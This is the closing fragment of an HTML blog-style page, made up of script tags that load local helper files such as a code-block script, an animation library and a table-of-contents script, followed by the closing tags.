<script src="/js/code-block.js"></script>





<div class="post-scripts">
    
        
<script src="/js/post-helper.js"></script>

        
            
<script src="/js/libs/anime.min.js"></script>

        
        
            
<script src="/js/toc.js"></script>

        
    
</div>



</body>
</html>
